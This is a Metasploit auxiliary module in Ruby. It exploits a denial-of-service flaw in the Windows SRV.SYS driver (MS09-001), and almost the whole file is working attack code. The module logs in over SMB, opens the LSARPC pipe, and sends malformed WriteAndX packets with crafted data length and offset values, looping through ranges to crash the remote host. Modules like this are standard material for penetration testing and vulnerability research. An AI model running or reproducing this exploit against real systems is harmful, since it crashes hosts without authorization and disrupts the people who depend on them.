##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SRV.SYS WriteAndX Invalid DataOffset',
      'Description'    => %q{
          This module exploits a denial of service vulnerability in the
        SRV.SYS driver of the Windows operating system.

        This module has been tested successfully against Windows Vista.
      },

      'Author'         => [ 'j.v.vallejo[at]gmail.com' ],
      'License'        => MSF_LICENSE,
      'References' =>
        [
          ['MSB', 'MS09-001'],
          ['OSVDB', '48153'],
          ['CVE', '2008-4114'],
          ['BID', '31179'],
        ]
      )
    )
  end


  def send_smb_pkt(dlenlow, doffset,fillersize)

    connect()
    smb_login()

    pkt = CONST::SMB_CREATE_PKT.make_struct
    pkt['Payload']['SMB'].v['Flags1'] = 0x18
    pkt['Payload']['SMB'].v['Flags2'] = 0xc807

    pkt['Payload']['SMB'].v['MultiplexID'] = simple.client.multiplex_id.to_i
    pkt['Payload']['SMB'].v['TreeID'] = simple.client.last_tree_id.to_i
    pkt['Payload']['SMB'].v['UserID'] = simple.client.auth_user_id.to_i
    pkt['Payload']['SMB'].v['ProcessID'] = simple.client.process_id.to_i

    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_CREATE_ANDX

    pkt['Payload']['SMB'].v['WordCount'] = 24

    pkt['Payload'].v['AndX'] = 255
    pkt['Payload'].v['AndXOffset'] = 0xdede
    pkt['Payload'].v['FileNameLen'] = 14
    pkt['Payload'].v['CreateFlags'] = 0x16
    pkt['Payload'].v['AccessMask'] = 0x2019f  # Maximum Allowed
    pkt['Payload'].v['ShareAccess'] = 7
    pkt['Payload'].v['CreateOptions'] = 0x400040
    pkt['Payload'].v['Impersonation'] = 2
    pkt['Payload'].v['Disposition'] = 1
    pkt['Payload'].v['Payload'] = "\x00\\\x00L\x00S\x00A\x00R\x00P\x00C" + "\x00\x00"


    simple.client.smb_send(pkt.to_s)
    ack = simple.client.smb_recv_parse(CONST::SMB_COM_NT_CREATE_ANDX)

    pkt = CONST::SMB_WRITE_PKT.make_struct
    data_offset = pkt.to_s.length - 4
    filler = Rex::Text.rand_text(fillersize)

    pkt['Payload']['SMB'].v['Signature1']=0xcccccccc
    pkt['Payload']['SMB'].v['Signature2']=0xcccccccc
    pkt['Payload']['SMB'].v['MultiplexID'] = simple.client.multiplex_id.to_i
    pkt['Payload']['SMB'].v['TreeID'] = simple.client.last_tree_id.to_i
    pkt['Payload']['SMB'].v['UserID'] = simple.client.auth_user_id.to_i
    pkt['Payload']['SMB'].v['ProcessID'] = simple.client.process_id.to_i
    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_WRITE_ANDX
    pkt['Payload']['SMB'].v['Flags1'] = 0x18
    pkt['Payload']['SMB'].v['Flags2'] = 0xc807
    pkt['Payload']['SMB'].v['WordCount'] = 14
    pkt['Payload'].v['AndX'] = 255
    pkt['Payload'].v['AndXOffset'] = 0xdede
    pkt['Payload'].v['FileID'] = ack['Payload'].v['FileID']
    pkt['Payload'].v['Offset'] = 0
    pkt['Payload'].v['Reserved2'] = -1
    pkt['Payload'].v['WriteMode'] = 8
    pkt['Payload'].v['Remaining'] = fillersize
    pkt['Payload'].v['DataLenHigh'] = 0
    pkt['Payload'].v['DataLenLow'] = dlenlow #<==================
    pkt['Payload'].v['DataOffset'] = doffset #<====
    pkt['Payload'].v['DataOffsetHigh'] = 0xcccccccc #<====
    pkt['Payload'].v['ByteCount'] = fillersize #<====
    pkt['Payload'].v['Payload'] = filler

    simple.client.smb_send(pkt.to_s)
  end

  def run

    print_line("Attempting to crash the remote host...")
    k=72
    j=0xffff
    while j>10000
      i=0xffff
      while i>10000
        begin
          print_line("datalenlow=#{i} dataoffset=#{j} fillersize=#{k}")
          send_smb_pkt(i,j,k)
        rescue
          print_line("rescue")
        end
        i=i-10000
      end
      j=j-10000
    end
  end
end
